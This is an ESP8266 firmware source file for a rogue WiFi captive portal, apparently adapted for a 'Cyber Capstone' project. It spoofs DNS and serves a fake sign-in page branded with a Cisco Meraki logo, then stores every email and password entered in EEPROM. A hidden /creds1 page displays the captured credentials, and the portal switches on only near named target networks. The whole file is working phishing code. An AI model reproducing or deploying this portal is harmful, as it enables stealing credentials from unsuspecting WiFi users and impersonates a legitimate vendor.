// ESP8266 WiFi Captive Portal
// By adamff-dev (github.com/adamff-dev)
// Modified by Simon Vance

// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP_EEPROM.h>

// User configuration
#define SSID_NAME "Cyber Capstone"
#define TITLE "Welcome to Free Wifi"
#define BODY "<p>You will need to be on the list of authorized users for this network in order to access the Internet.</p>"
#define POST_TITLE "Validating..."
#define POST_BODY "<h7><p>Your account is being validated. Please, wait up to 5 minutes for device connection.</h7></br><h7>Thank you.</p></h7>"
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

//Trigger networks
const char* tssid1 = "Target 1";
const char* tssid2 = "Target 2";
const char* tssid3 = "Development";
const int scanInterval = 15000; // Amount of requests before it scans for networks again. I actually had to keep this number down because it used too little power and the battery automatically shut off.
bool trigger = false;

int process = 500;  // Time between processing each request - higher uses more power, lower makes a slower response.
int cycles = 120;  // Amount of requests before it checks for a trigger network
int e;

//EEPROM dependencies
int totalSize = 255;
byte place;

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);  // Gateway

String Credentials = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  String j =
    "<style>"
    "h3 { font-size: 9px; font-weight: 400; letter-spacing: 1px; color: #888; }"
    "blo {width: 100%; background: #eee; border-top: 1px solid #ddd; padding: 2em 0; text-align: center; display: inline-block;}"
    "</style>"
    "<blo/>"
    "<h3>POWERED BY</h3>"
    "<img width=\"100\" alt=\"Cisco Meraki\" src=\"data:image/png;base64,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\" />"
    "<div/>";
  return j;
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h4 { font-size: 30px; font-weight: 100; line-height: 35px; text-align: center; color: #555; margin: 0 0 1em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #ffffff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; }"
               "h6 { font-size: 9px; line-height: 0.1; font-weight: 400; font-family: verdana; letter-spacing: 1px; color: #888; }"
               "h7 { font-size: 15px; font-weight: 350; line-height: 20px; text-align: center; color: #555; margin: 0 0 1em; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>"
             "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>"
             + CSS + "</style></head>"
                     "<body><nav><b>"
                     "</b> "
                     "</nav><div><h4>"
             + t + "</h4></div><div>";
  return h;
}

String creds() {
  READPROM();
  String Credentials = "";
  for (int e = 0; e < elements(); e++) {
    String email = article(e);
    e++;
    String password = article(e);
    Credentials = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
  }
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<hr><div><h7>" + BODY + "</h7></ol></div><div><form action=/post method=post>"
                                                  "<b><h6>USERNAME</h6></b> <center><input type=text autocomplete=email name=email></input></center>"
                                                  "<b><h6>PASSWORD</h6></b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>"
         + footer();
}

String posted() {
  String email = input("email");
  String password = input("password");
  WRITEPROM(email);
  WRITEPROM(password);
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  String email = "<p></p>";
  String password = "<p></p>";
  Credentials = "<p></p>";
  place = 1;
  EEPROM.write(1, place);
  EEPROM.commit();
  Serial.println("Cleared list");
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

String article(int ID) { // retrieves a specific string from the EEPROM
  int h = 0; // current ID
  int p = 2; // temp place
  char c;
  String str = "";
  while(h < ID){
    c = EEPROM.read(p);
    while(c != '\n'){
      p++;
      c = EEPROM.read(p);
      if(c == '\n'){ 
        h++; 
        p++; 
      }
    }
  }
  c = EEPROM.read(p);
  while(c != '\n'){
    c = EEPROM.read(p);
    str += c;
    p++;
  }
  return str;
}

int elements() { //Checks the number of articles stored in the EEPROM
  int number = 0;
  char c;
  for (int i = 2; i < (place + 1); i++) {
    c = EEPROM.read(i);
    if (c == '\n') {
      number++;
    }
  }
  return number;
}

void BLINK(int blink) {  // The internal LED will blink 5 times when a password is received.
  for (int count = 0; count < blink; ++count) {
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    if (blink > 1) { delay(500); }
  }
}

void READPROM() {  // Prints all the available EEPROM memory
  Serial.print(EEPROM.read(1));
  Serial.print(" bytes used of ");
  Serial.println(totalSize);
  char b;
  for (int i = 2; i < (place + 1); i++) {
    b = EEPROM.read(i);
    Serial.print(b);
  }
}

void WRITEPROM(String DATA) {  // Writes data to the EEPROM
  Serial.println("Writing to memory");
  int ArrayLength = DATA.length() + 1;  //The +1 is for the 0x00h Terminator
  char aDATA[ArrayLength];
  DATA.toCharArray(aDATA, ArrayLength);
  for (int i = 0; i < DATA.length(); i++) {
    place++;
    EEPROM.write(place, aDATA[i]);
    Serial.print(aDATA[i]);
  }
  place++;
  EEPROM.write(place, '\n');
  Serial.print('\n');
  EEPROM.write(1, place);
  EEPROM.commit();
}

void setup() {
  bootTime = lastActivity = millis();
  Serial.begin(74880);
  EEPROM.begin(totalSize);
  delay(100);
  if (EEPROM.read(1) == '\0') {
    place = 1;
    Serial.println("Set place to 1");
  }  //Check if there is any data on the EEPROM
  else { place = EEPROM.read(1); }
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (Only HTTP)
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK(5);
  });
  webServer.on("/creds1", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
  Serial.print('\n');
  Serial.println("CURRENT MEMORY DUMP:");
  READPROM();
}

void loop() {
  while (!trigger) {
    int numberOfNetworks = WiFi.scanNetworks();
    for (int i = 0; i < numberOfNetworks; ++i) {
      if (WiFi.SSID(i) == tssid1 || WiFi.SSID(i) == tssid2 || WiFi.SSID(i) == tssid3) {
        trigger = true;
        Serial.print("Network \"");
        Serial.print(WiFi.SSID(i));
        Serial.println("\" Found!");
        BLINK(1);
        break;
      } else {
        trigger = false;
      }
    }
    if (trigger == true) {
      WiFi.mode(WIFI_AP);
      e = 0;

    } else {
      Serial.print("Trigger network not found. Next scan in ");
      Serial.print(scanInterval / 1000);
      Serial.println(" seconds.");
      WiFi.mode(WIFI_STA);
      delay(scanInterval);
    }
  }
  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
  dnsServer.processNextRequest();
  webServer.handleClient();
  delay(process);
  if (e >= cycles) {
    trigger = false;
  } else {
    e++;
    Serial.print(e);
    Serial.print("/");
    Serial.println(cycles);
  }
}
